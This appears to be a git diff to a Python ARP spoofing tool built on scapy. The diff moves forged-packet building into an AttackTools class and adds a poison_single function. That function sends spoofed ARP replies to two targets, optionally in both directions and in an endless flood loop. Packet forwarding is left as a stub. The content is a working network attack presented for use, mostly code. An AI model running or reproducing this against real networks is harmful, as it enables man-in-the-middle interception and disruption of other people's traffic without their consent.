@@ -2,7 +2,6 @@ import scapy.layers.l2
 from scapy.all import *
 import netifaces
 from math import log
-from uuid import getnode as get_mac
 
 
 class Interface:
@@ -11,6 +10,7 @@ class Interface:
         self.netmask = netmask
         self.addr = addr
         self.hwaddr = hwaddr
+        self.host = Host(addr, hwaddr)
 
     def get_name(self):
         return self.name
@@ -23,6 +23,9 @@ class Interface:
 
     def get_hwaddr(self):
         return self.hwaddr
+
+    def get_host(self):
+        return self.host
 
 
 class Host:
@@ -176,26 +179,53 @@ class CommandLineInterface:
         return selected_hosts
 
 
-def build_packet(mac_attacker: str, ip_to_spoof: str, mac_victim: str, ip_victim: str):
-    ether_index = 0
-    arp_index = 1
+class AttackTools:
+    @staticmethod
+    def build_arp_response(attacker: Host, target1: Host, target2: Host):
+        ether_index = 0
+        arp_index = 1
 
-    arp = scapy.layers.l2.Ether() / scapy.layers.l2.ARP()
-    arp[ether_index].src = mac_attacker
-    arp[arp_index].hwsrc = mac_attacker
-    arp[arp_index].psrc = ip_to_spoof
-    arp[arp_index].hwdst = mac_victim
-    arp[arp_index].pdst = ip_victim
+        arp = scapy.layers.l2.Ether() / scapy.layers.l2.ARP()
+        arp[ether_index].src = attacker.get_hwaddr()
+        arp[arp_index].hwsrc = attacker.get_hwaddr()
+        arp[arp_index].psrc = target1.get_addr()
+        arp[arp_index].hwdst = target2.get_hwaddr()
+        arp[arp_index].pdst = target2.get_addr()
 
-    return arp
+        return arp
+
+    @staticmethod
+    def poison_single(attacker: Host, target1: Host, target2: Host, bidirectional: bool, forwarding: bool, flood: bool):
+        # TODO: Add error detection
+        arp1 = AttackTools.build_arp_response(attacker, target1, target2)
+        if not flood:
+            sendp(arp1)
+
+        if bidirectional:
+            arp2 = AttackTools.build_arp_response(attacker, target2, target1)
+            if not flood:
+                sendp(arp2)
+
+        if forwarding:
+            # TODO: Implement packet forwarding
+            pass
+
+        # TODO: Add flood condition
+        if flood and bidirectional:
+            while True:
+                sendp(arp1)
+                sendp(arp2)
+
+        elif flood:
+            while True:
+                sendp(arp1)
 
 
 def main():
     print("This is an ARP Spoofing tool.\n")
     selected_interface = CommandLineInterface.interface_selector()
     targets = CommandLineInterface.host_selector(selected_interface)
-    build_packet(selected_interface.get_hwaddr(), targets[0], "", targets[1])
-    print(targets[0].get_hwaddr())
+    AttackTools.build_arp_response(selected_interface.get_host(), targets[0], targets[1])
 
 
 main()
